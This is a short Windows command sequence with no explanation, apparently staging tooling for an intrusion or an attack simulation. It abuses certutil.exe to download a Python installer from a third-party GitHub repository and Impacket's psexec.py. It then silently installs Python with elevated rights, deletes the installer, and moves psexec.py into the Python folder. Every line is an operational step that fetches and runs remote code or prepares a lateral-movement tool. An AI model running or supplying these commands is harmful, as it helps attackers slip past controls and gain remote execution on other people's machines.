C:\Windows\System32\Certutil.Exe -Urlcache -Split -F https://github.com/crjtpp/tools_public/raw/main/python-3.11.1-amd64.exe $env:TEMP\pythonwinx64.Exe
C:\Windows\System32\Certutil.Exe -Urlcache -Split -F https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py $env:TEMP\psexec.py
Start-Process -FilePath $env:TEMP\pythonwinx64.Exe -Args "/S" -Verb RunAs -Wait
Remove-Item $env:TEMP\pythonwinx64.Exe
Move-Item $env:temp\psexec.py $env:localappdata\Programs\Python\Python311\
